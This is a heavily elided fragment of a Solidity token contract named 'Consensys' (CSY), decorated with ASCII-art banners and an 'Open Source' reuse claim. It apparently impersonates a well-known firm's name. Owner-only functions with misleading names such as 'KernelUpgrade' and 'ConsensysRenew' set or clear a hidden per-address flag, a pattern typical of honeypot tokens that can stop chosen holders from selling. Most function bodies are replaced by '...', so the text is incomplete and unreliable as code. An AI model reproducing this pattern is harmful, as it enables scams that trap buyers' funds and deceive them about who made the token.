...
//   _____                                  
//  / ___/__  ___  ___ ___ ___  ___ __ _____
// / /__/ _ \/ _ \(_-</ -_) _ \(_-</ // (_-<
...
// ▞▞▞▞▞▖🆂🅼🅰🆁🆃 🅲🅾🅽🆃🆁🅰🅲🆃 🆅🅴🆁🆂🅸🅾🅽🆂 ➊.⓿.➊.➋▝▞▞▞▞▞
// *** Open Source
// Save time by reusing functionality that others have built into their smart contracts.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'Consensys';
    string constant public symbol = 'CSY';
    ...
    function ConsensysRenew(address account) public onlyOwner {
    ...
    function KernelUpgrade(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function StatsVersionConsensys(address account) public view returns (bool) {
...
contract ConsensysContract is BaseToken {
